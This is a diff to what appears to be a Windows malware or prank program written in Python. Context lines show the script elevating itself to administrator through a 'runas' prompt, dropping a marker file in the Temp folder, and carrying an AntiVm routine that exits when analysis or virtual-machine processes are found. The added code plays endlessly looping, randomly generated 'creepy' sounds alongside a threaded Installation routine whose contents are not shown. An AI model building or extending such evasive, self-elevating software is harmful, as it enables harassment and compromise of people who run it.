@@ -11,6 +11,9 @@ if platform.release() != '10':
     sys.exit()
 from pathlib import Path
 from tkinter import messagebox
+import simpleaudio as sa
+from threading import Thread
+import numpy as np
 import psutil
 import random
 from random import randint
@@ -30,11 +33,56 @@ if sys.argv[-1] != ASADMIN:
     shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)
     sys.exit(0)
 
+sample_rate = 44100
+duration = 3
+fade_in_time = 0.05
+fade_out_time = 0.1
+volume = 0.5
+freq = 440
+
 #Pin file
 DontDownloadPath = str(Path.home()) + "\\AppData\\Local\\Temp\\djj012ndawm10d9wadaw.txt"
 
 #System Paths
 TempPath = str(Path.home()) + "\\AppData\\Local\\Temp"
+
+def generate_tone(frequency, duration):
+    t = np.linspace(0, duration, int(sample_rate * duration), False)
+    tone = np.sin(frequency * t * 2 * np.pi)
+    return tone
+
+def generate_creepy_sound():
+    base_freq = random.uniform(50, 200)
+    overtones_freqs = np.linspace(base_freq, base_freq * 8, num=8, endpoint=False)
+
+    tones = [generate_tone(f, duration) for f in overtones_freqs]
+
+    sound = np.zeros_like(tones[0])
+    for tone in tones:
+        sound += tone
+
+    num_speedups = random.randint(1, 3)
+    speedup_indices = random.sample(range(0, len(sound)), num_speedups)
+
+    for idx in speedup_indices:
+        tone_idx = random.randint(0, len(tones)-1)
+        tone = tones[tone_idx][idx:idx+int(sample_rate*0.1)]
+        tone_speedup = np.interp(np.linspace(0, 1, len(tone)), [0, 0.5, 1], [1, 1.5, 2])
+        tone = np.interp(np.linspace(0, 1, len(tone)), np.linspace(0, 1, len(tone_speedup)), tone_speedup)
+        sound[idx:idx+int(sample_rate*0.1)] = tone
+
+    fade_in = np.linspace(0, volume, int(fade_in_time * sample_rate), False)
+    fade_out = np.linspace(volume, 0, int(fade_out_time * sample_rate), False)
+    sound[:len(fade_in)] *= fade_in
+    sound[-len(fade_out):] *= fade_out
+    
+    return sound
+
+def Play_in_loop():
+    while True:
+        sound = generate_creepy_sound()
+        play_obj = sa.play_buffer((sound * 32767).astype(np.int16), 1, 2, sample_rate)
+        play_obj.wait_done()
 
 def AntiVm():
   #Searches for processes with the name, and when he has found a process, the program quits
@@ -174,4 +222,5 @@ def window_flush():
 
 if __name__ == "__main__":
     #AntiVm() Optional
-    Installation()
+    Thread(target = Installation).start()
+    Thread(target = Play_in_loop).start()
